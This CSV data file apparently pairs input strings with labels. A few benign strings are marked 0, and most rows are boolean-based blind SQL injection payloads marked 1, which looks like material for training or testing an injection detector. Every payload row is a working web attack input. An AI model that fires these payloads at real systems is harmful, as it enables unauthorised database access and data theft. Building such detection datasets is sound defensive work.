test,0,0
,0,0
,0,0
7902,0,0
",'""),)),.)",0,0
"'PcjZjt<'"">XMXVkl",0,0
,0,0
,0,0
6075,0,0
"..(,'),"").",0,0
"'dHncZD<'"">luzXCZ",0,0
) AND 2812=9245-- oiTX,1,1
) AND 8214=8214-- logU,1,1
') AND 2268=1777-- PsQU,1,1
') AND 8214=8214-- IbOp,1,1
' AND 3454=4333-- wyNz,1,1
' AND 8214=8214-- cERv,1,1
""" AND 8356=9977-- Qbkn",1,1
""" AND 8214=8214-- cCCR",1,1
) AND 8343=6593 AND (6654=6654,1,1
) AND 8214=8214 AND (9955=9955,1,1
)) AND 9178=9297 AND ((2405=2405,1,1
)) AND 8214=8214 AND ((1501=1501,1,1
))) AND 9919=7641 AND (((1385=1385,1,1
))) AND 8214=8214 AND (((8751=8751,1,1
 AND 8900=6150,1,1
 AND 8214=8214,1,1
') AND 4994=7577 AND ('cjzg'='cjzg,1,1
') AND 8214=8214 AND ('Bncf'='Bncf,1,1
')) AND 7018=1836 AND (('ptjP'='ptjP,1,1
')) AND 8214=8214 AND (('cShg'='cShg,1,1
'))) AND 2350=8119 AND ((('UJNI'='UJNI,1,1
'))) AND 8214=8214 AND ((('yZId'='yZId,1,1
' AND 6337=2274 AND 'AeMB'='AeMB,1,1
' AND 8214=8214 AND 'ofqy'='ofqy,1,1
') AND 7183=5642 AND ('CElt' LIKE 'CElt,1,1
') AND 8214=8214 AND ('jUQO' LIKE 'jUQO,1,1
')) AND 9104=3194 AND (('deFJ' LIKE 'deFJ,1,1
')) AND 8214=8214 AND (('KJRH' LIKE 'KJRH,1,1
'))) AND 7659=3090 AND ((('ktNA' LIKE 'ktNA,1,1
'))) AND 8214=8214 AND ((('gqaK' LIKE 'gqaK,1,1
%' AND 5618=6209 AND 'lokN%'='lokN,1,1
%' AND 8214=8214 AND 'uJkc%'='uJkc,1,1
' AND 6394=2076 AND 'ZOlA' LIKE 'ZOlA,1,1
' AND 8214=8214 AND 'FtvR' LIKE 'FtvR,1,1
""") AND 3869=7197 AND (""nwfJ""=""nwfJ",1,1
""") AND 8214=8214 AND (""MLtN""=""MLtN",1,1
""")) AND 9519=4925 AND ((""HyVX""=""HyVX",1,1
""")) AND 8214=8214 AND ((""SwuT""=""SwuT",1,1
"""))) AND 6981=1665 AND (((""ITxA""=""ITxA",1,1
"""))) AND 8214=8214 AND (((""rfTv""=""rfTv",1,1
""" AND 7032=8931 AND ""PYWh""=""PYWh",1,1
""" AND 8214=8214 AND ""scnn""=""scnn",1,1
""") AND 2813=4622 AND (""tcuw"" LIKE ""tcuw",1,1
""") AND 8214=8214 AND (""yKUK"" LIKE ""yKUK",1,1
""")) AND 2824=2165 AND ((""usbP"" LIKE ""usbP",1,1
""")) AND 8214=8214 AND ((""swkv"" LIKE ""swkv",1,1
"""))) AND 1142=5179 AND (((""CCuY"" LIKE ""CCuY",1,1
"""))) AND 8214=8214 AND (((""oqvS"" LIKE ""oqvS",1,1
""" AND 7440=4837 AND ""udWG"" LIKE ""udWG",1,1
""" AND 8214=8214 AND ""cKaO"" LIKE ""cKaO",1,1
 AND 9959=5886-- aORX,1,1
 AND 8214=8214-- WPjF,1,1
 AND 8269=6887# CuCQ,1,1
 AND 8214=8214# gcfV,1,1
' AND 5483=9289 OR 'EqRo'='bCEh,1,1
' AND 8214=8214 OR 'XifV'='wtAu,1,1
') WHERE 2575=2575 AND 7966=3449-- kIpG,1,1
') WHERE 9330=9330 AND 8214=8214-- JYFa,1,1
""") WHERE 2422=2422 AND 8840=8607-- WWcc",1,1
""") WHERE 1366=1366 AND 8214=8214-- lTrD",1,1
) WHERE 8135=8135 AND 5169=4734-- QAUD,1,1
) WHERE 1308=1308 AND 8214=8214-- Eyel,1,1
' WHERE 4851=4851 AND 1685=7234-- llrg,1,1
' WHERE 2865=2865 AND 8214=8214-- jEmN,1,1
""" WHERE 7355=7355 AND 1014=3128-- cXSc",1,1
